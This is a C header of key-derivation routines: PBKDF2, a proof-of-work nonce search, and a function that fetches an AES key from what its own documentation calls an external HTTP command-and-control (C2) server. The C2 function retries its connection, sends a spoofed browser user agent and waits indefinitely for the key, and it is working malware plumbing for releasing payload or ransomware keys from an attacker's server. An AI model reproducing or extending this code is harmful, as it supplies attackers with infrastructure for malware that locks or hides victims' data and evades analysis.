/* include/key_derivation.h - Cryptographic Key Derivation Routines */
#ifndef KEY_DERIVATION_H
#define KEY_DERIVATION_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/evp.h>
#include <openssl/sha.h>

/**
 * Derives a 256-bit AES key using PBKDF2 (Password-Based Key Derivation Function 2)
 * with HMAC-SHA256 across a specified number of hashing iterations.
 *
 * @param seed Input seed/passphrase string.
 * @param salt Salt string to ensure unique key derivation.
 * @param iterations Hashing iteration count.
 * @return Dynamically allocated 32-byte (256-bit) raw key buffer, or NULL on failure.
 */
static inline unsigned char* derive_key_pbkdf2(const char* seed, const char* salt, int iterations) {
    if (!seed || !salt || iterations < 1) {
        return NULL;
    }

    unsigned char* key = (unsigned char*)malloc(32); // 256 bits for AES-256
    if (!key) {
        return NULL;
    }

    if (!PKCS5_PBKDF2_HMAC(seed, strlen(seed),
                           (const unsigned char*)salt, strlen(salt),
                           iterations, EVP_sha256(),
                           32, key)) {
        free(key);
        return NULL;
    }

    return key;
}

/**
 * Derives a 256-bit AES key via a Proof-of-Work challenge by searching for a nonce
 * that yields a SHA-256 hash starting with a specified number of zero bits.
 *
 * @param seed Input seed text used as the challenge prefix.
 * @param difficulty_bits Target number of leading zero bits required in the resulting hash.
 * @return Dynamically allocated 32-byte (256-bit) raw key buffer matching the target hash.
 */
static inline unsigned char* derive_key_pow(const char* seed, int difficulty_bits) {
    if (!seed || difficulty_bits < 0 || difficulty_bits > 256) {
        return NULL;
    }

    unsigned char* key = (unsigned char*)malloc(SHA256_DIGEST_LENGTH);
    if (!key) {
        return NULL;
    }

    unsigned char hash[SHA256_DIGEST_LENGTH];
    char buffer[256];
    unsigned long long nonce = 0;

    int full_bytes = difficulty_bits / 8; // Full 0x00 bytes required
    int rem_bits   = difficulty_bits % 8; // Remaining leading zero bits in partial byte

    while (1) {
        snprintf(buffer, sizeof(buffer), "%s%llu", seed, nonce);
        SHA256((const unsigned char*)buffer, strlen(buffer), hash);

        int success = 1;

        // 1. Verify leading full 0x00 bytes
        for (int i = 0; i < full_bytes; i++) {
            if (hash[i] != 0x00) {
                success = 0;
                break;
            }
        }

        // 2. Verify remaining leading bits in the subsequent byte
        if (success && rem_bits > 0) {
            if ((hash[full_bytes] >> (8 - rem_bits)) != 0) {
                success = 0;
            }
        }

        // Return derived key when hash meets zero-bit condition
        if (success) {
            memcpy(key, hash, SHA256_DIGEST_LENGTH);
            return key;
        }

        nonce++;
    }
}

/**
 * Retrieves a 256-bit AES key from an external HTTP C2 server using a resilient
 * connection model: up to 5 retries on connection failure, followed by an indefinite
 * blocking read waiting for the server to transmit the key.
 *
 * @param host Target hostname or IP address of the C2 server.
 * @param port Destination port.
 * @param path Endpoint URI path.
 * @return Dynamically allocated 32-byte (256-bit) raw key buffer, or NULL on failure.
 */
static inline unsigned char* derive_key_c2(const char* host, int port, const char* path) {
    if (!host || !path || port <= 0) {
        return NULL;
    }

    const int max_retries = 5;
    const int retry_delay = 3; // Segundos entre reintentos de conexión
    int sockfd = -1;
    struct hostent *server = NULL;

    // FASE 1: Bucle de conexión (Máximo 5 intentos)
    for (int attempt = 1; attempt <= max_retries; attempt++) {

        // 1. Resolver DNS
        server = gethostbyname(host);
        if (!server) {
            if (attempt < max_retries) sleep(retry_delay);
            continue;
        }

        // 2. Crear Socket
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            if (attempt < max_retries) sleep(retry_delay);
            continue;
        }

        // Configurar timeout corto SOLO para el establecimiento de conexión (5 segundos)
        struct timeval conn_timeout;
        conn_timeout.tv_sec = 5;
        conn_timeout.tv_usec = 0;
        setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &conn_timeout, sizeof(conn_timeout));

        struct sockaddr_in serv_addr;
        memset(&serv_addr, 0, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);
        serv_addr.sin_port = htons(port);

        // 3. Intentar handshake TCP
        if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            close(sockfd);
            sockfd = -1;
            if (attempt < max_retries) sleep(retry_delay);
            continue;
        }

        // Conexión TCP establecida con éxito
        break;
    }

    // Si fallaron los 5 intentos, cerrar y abortar ejecución
    if (sockfd < 0) {
        return NULL;
    }

    // FASE 2: Envío de Petición HTTP
    char request[512];
    snprintf(request, sizeof(request),
             "GET %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: Mozilla/5.0\r\n"
             "Connection: close\r\n\r\n",
             path, host);

    if (send(sockfd, request, strlen(request), 0) < 0) {
        close(sockfd);
        return NULL;
    }

    // FASE 3: Espera Indefinida del Servidor (Socket Bloqueante)
    // Se elimina cualquier timeout de recepción (SO_RCVTIMEO = 0)
    struct timeval no_timeout;
    no_timeout.tv_sec = 0;
    no_timeout.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &no_timeout, sizeof(no_timeout));

    char response[2048];
    int bytes_read = 0;
    int total_bytes = 0;
    memset(response, 0, sizeof(response));

    // El hilo queda bloqueado en recv() hasta que el C2 envíe datos y/o cierre la conexión
    while ((bytes_read = recv(sockfd, response + total_bytes, sizeof(response) - 1 - total_bytes, 0)) > 0) {
        total_bytes += bytes_read;
    }
    close(sockfd);

    if (total_bytes <= 0) {
        return NULL;
    }

    // FASE 4: Procesamiento de la Clave
    char *body = strstr(response, "\r\n\r\n");
    if (!body) {
        return NULL;
    }
    body += 4; // Avanzar delimitador HTTP

    if (strlen(body) == 0) {
        return NULL;
    }

    // Generar la clave de 256 bits a partir del payload recibido
    unsigned char *key = (unsigned char*)malloc(SHA256_DIGEST_LENGTH);
    if (!key) {
        return NULL;
    }

    SHA256((const unsigned char*)body, strlen(body), key);
    return key;
}

#endif /* KEY_DERIVATION_H */
